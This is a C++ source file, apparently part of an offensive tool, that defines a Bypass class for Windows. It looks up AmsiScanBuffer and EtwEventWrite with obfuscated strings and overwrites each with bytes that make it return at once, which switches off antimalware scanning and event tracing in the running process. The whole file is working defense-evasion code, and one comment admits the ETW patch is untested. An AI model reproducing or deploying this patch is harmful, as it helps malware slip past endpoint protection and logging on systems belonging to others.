#include "Bypass.h"

#include "Obfus.h"

void Bypass::WriteMem(FARPROC addr, Patch patch) {
	HANDLE currentProcessHandle = GetCurrentProcess();
	SIZE_T rBytes;

	WriteProcessMemory(currentProcessHandle, (LPVOID)addr, patch.patchBytes.data(), patch.size, &rBytes);
}

bool Bypass::PatchAMSI() {
	FARPROC addr = GetAddr(std::string(AY_OBFUSCATE("amsi.dll")), std::string(AY_OBFUSCATE("AmsiScanBuffer")));
	Patch amsi;

	amsi.size = 4;// x64
	amsi.patchBytes = { 0x48, 0x31, 0xC0, 0xC3 };// x64
		
	WriteMem(addr, amsi);
	return true;
}

bool Bypass::PatchETW() {// test this.
	FARPROC addr = GetAddr(std::string(AY_OBFUSCATE("ntdll.dll")), std::string(AY_OBFUSCATE("EtwEventWrite")));
	Patch ETW;

	// @TODO actaully test that this patch works, currently it's just an assumption.

	ETW.size = 4;
	ETW.patchBytes = { 0x48, 0x31, 0xC0, 0xC3 };// x64

	WriteMem(addr, ETW);
	return true;
}

FARPROC Bypass::GetAddr(std::string dllName, std::string fName){
	// @TODO change this to manually loading dll's
	HMODULE DLLHandle = LoadLibraryA(dllName.c_str());
	FARPROC functionAddress = GetProcAddress(DLLHandle, fName.c_str());

	return functionAddress;
}